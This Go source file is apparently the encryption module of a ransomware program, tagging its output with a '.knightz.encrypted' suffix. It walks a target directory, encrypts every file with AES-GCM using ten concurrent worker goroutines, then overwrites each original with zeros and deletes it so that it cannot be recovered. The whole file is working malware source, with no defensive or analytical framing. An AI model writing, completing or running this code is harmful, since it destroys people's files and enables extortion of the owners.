// <PROJECT DIR>/subprocess/ciphers/encryption.go
package ciphers

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"sync"
)

// Delete and overwrite the contents of the file so that it cannot be recovered
func resetFileContents(filepath string) error {
	// Byte by byte, write 0 to the file
	file, err := os.OpenFile(filepath, os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("Error opening file: %v", err)
		return err
	}

	fileInfo, err := file.Stat()
	if err != nil {
		log.Fatalf("Error getting file info: %v", err)
		return err
	}

	// Write 0 to the file at a size equal to the file size
	for i := 0; i < int(fileInfo.Size()); i++ {
		_, err = file.WriteAt([]byte{0}, int64(i))
		if err != nil {
			log.Fatalf("Error writing to file: %v", err)
			return err
		}
	}

	err = file.Close()
	if err != nil {
		log.Fatalf("Error closing file: %v", err)
		return err
	}

	return nil
}

// Encrypt the given file (specified by filename) in AES using the given key
func encryptFileAES(filepath string, key []byte) error {
	plaintext, err := os.ReadFile(filepath)
	if err != nil {
		log.Fatalf("Error reading file: %v", err)
		return err
	}

	aesBlock, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalf("Error creating AES block: %v", err)
		return err
	}

	aesGCM, err := cipher.NewGCM(aesBlock)
	if err != nil {
		log.Fatalf("Error creating GCM: %v", err)
		return err
	}

	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		log.Fatalf("Error generating nonce: %v", err)
		return err
	}

	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
	encryptedFilepath := filepath + ".knightz.encrypted"
	os.WriteFile(encryptedFilepath, ciphertext, 0644)

	// To prevent recovery of the original file, overwrite the contents of the original file and delete it
	err = resetFileContents(filepath)
	if err != nil {
		log.Fatalf("Error resetting file contents: %v", err)
		return err
	}

	err = os.Remove(filepath)
	if err != nil {
		log.Fatalf("Error deleting file: %v", err)
		return err
	}

	return nil
}

// A worker reads the file (given by its filepath) from the channel, then conduct encryption
// This will be executed concurrently by goroutines
func encryptionWroker(workerNumber int, filepaths <-chan string, key []byte, wg *sync.WaitGroup) {
	defer wg.Done()
	for filepath := range filepaths {
		err := encryptFileAES(filepath, key)
		if err != nil {
			fmt.Printf("[Worker #%02d]Encrypting file: %s => failed (reason: %v)\n", workerNumber, filepath, err)
			continue
		} else {
			fmt.Printf("[Worker #%02d]Encrypting file: %s => success\n", workerNumber, filepath)
		}
	}
}

// EncryptDirectory walks through the directory and encrypts each file
func EncryptDirectory(targetDirectory string, key []byte) error {
	// Create a channel to share filepaths with the encryption worker goroutines
	targetFiles := make(chan string, 1024)
	var wg sync.WaitGroup

	const numberOfEncryptionWorkers = 10
	for i := 0; i < numberOfEncryptionWorkers; i++ {
		wg.Add(1)
		go encryptionWroker(i+1, targetFiles, key, &wg)
	}

	// Walk through the target directory and send the filepaths to the channel
	err := filepath.Walk(targetDirectory, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if !info.IsDir() {
			targetFiles <- path
		}
		return nil
	})

	if err != nil {
		log.Fatalf("Error walking through directory: %v", err)
		return err
	}

	// All target files have been sent to the channel
	// Close the files channel and wait for all workers to finish
	close(targetFiles)

	// Wait for all workers to finish
	wg.Wait()

	return nil
}
